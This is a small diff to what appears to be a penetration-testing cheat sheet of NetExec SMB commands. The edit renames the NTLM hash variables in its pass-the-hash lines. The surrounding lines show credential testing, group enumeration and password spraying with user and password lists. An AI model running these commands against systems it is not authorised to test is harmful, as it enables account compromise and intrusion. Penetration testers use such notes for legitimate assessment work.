@@ -48,8 +48,8 @@ nxc smb $TARGET -u $USER -p $PASSWORD --groups
 nxc smb $TARGET -u $USER -p $PASSWORD
 
 # Test with NTLM hash (Pass-the-Hash)
-nxc smb $TARGET -u $USER -H $LMHASH:$NTHASH
-nxc smb $TARGET -u $USER -H $NTHASH
+nxc smb $TARGET -u $USER -H $LM_HASH:$NT_HASH
+nxc smb $TARGET -u $USER -H $NT_HASH
 
 # Password spraying with lists
 nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success
